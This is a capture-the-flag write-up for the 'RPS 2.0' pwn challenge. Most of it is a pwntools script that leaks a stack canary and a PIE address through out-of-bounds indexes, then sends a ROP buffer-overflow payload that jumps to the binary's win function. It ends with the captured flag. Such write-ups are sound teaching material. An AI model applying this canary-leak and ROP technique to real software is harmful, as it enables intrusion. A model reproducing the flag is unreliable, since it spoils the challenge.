Title: RPS 2.0

Description:
```
Rock Paper Scissors QOL Update, hope you like it~

nc alpha.8059blank.ml 3000
nc beta.8059blank.ml 3000

Author: Lucas
```

Given files: [rglddwapswthssf.jpg](https://github.com/Coder-Here/HACK-AC-2022-CTF/blob/main/Pwn/RPS%202.0/rglddwapswthssf.jpg "rglddwapswthssf.jpg") [rps2](https://github.com/Coder-Here/HACK-AC-2022-CTF/blob/main/Pwn/RPS%202.0/rps2 "rps2") [rps2.c](https://github.com/Coder-Here/HACK-AC-2022-CTF/blob/main/Pwn/RPS%202.0/rps2.c "rps2.c")

Need to get canary. Let's fuzz it.

Code to solve:

```python
from pwn import *

elf = context.binary = ELF('./rps2')
rop = ROP(elf)
#p = process()
#input()
p = remote('alpha.8059blank.ml', 3000)

moves = [ "Rock", "Gun", "Lightnig", "Devil", "Dragon", "Water", "Air", "Paper", "Sponge", "Wolf", "Tree", "Human",\
"Snake", "Scissors", "Fire"]

def i_win():
    p.recvuntil(b'I choose ')
    bot = moves.index(p.recvline().strip().decode())
    me = str((bot + 2) % 15 + 1).encode()
    return me

# How to obtain this index? 
# run fuzzer.py, look for the first value OUTSIDE of ur array that ends with 00. these usually indicate canaries which
# always end with 00. Note that it should be very close to the end of your array.
p.clean()
p.sendline("18")
p.recvuntil(b'You chose ')
canary = u64(p.recvline().strip().rjust(8, b'\x00'))
print(hex(canary))


# How to obtain this index? 
# run fuzzer.py, look for the first value that has 0x55 or 0x56. these usually indicate PIE addresses since PIE always
# starts with 0x55 or 0x56.
# there's another one at -183, but -31 is easier to use cos -183 points to unknown addr 
p.sendline("-31")
p.recvuntil(b'You chose ')
pie = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(pie))

# shld be 0x55...970

pie = pie - 0x970
print(hex(pie))
print(hex(pie + elf.symbols.win)) # we want this :)

# clear tutorial
p.sendline(i_win())

p.sendline(i_win())
p.sendline(i_win())
p.sendline(i_win())
p.sendline(i_win())
win = i_win()
payload = flat(
    win + b'A'*(8 - len(win)),
    canary,
    b'A'*8,
    pie + rop.ret.address, # movaps issue - ask in discord if not sure what this is
    pie + elf.symbols.win,
)
print(payload)
p.sendline(payload)
p.interactive()
```

Flag: ACSI{sp0nge_b3ats_gun_a46h01}
